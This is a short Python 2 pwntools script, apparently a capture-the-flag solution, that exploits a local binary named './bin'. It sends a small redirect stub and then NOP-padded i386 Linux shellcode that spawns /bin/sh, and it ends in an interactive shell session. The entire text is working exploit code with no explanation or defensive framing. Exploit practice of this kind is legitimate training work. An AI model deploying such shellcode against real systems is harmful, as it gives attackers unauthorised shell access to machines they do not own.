from pwn import *
context.log_level = 'debug'

shellcode1 = asm('pop ecx;mov cl,0xbe;push ecx;ret')
print shellcode1
sh = asm(shellcraft.i386.linux.sh())
shellcode2 = '\x90'*5 + sh + '\x90'*(0x1000-len(sh)-6)
print shellcode2
t = process('./bin')

t.sendline(shellcode1)

t.sendline(shellcode2)

t.interactive()
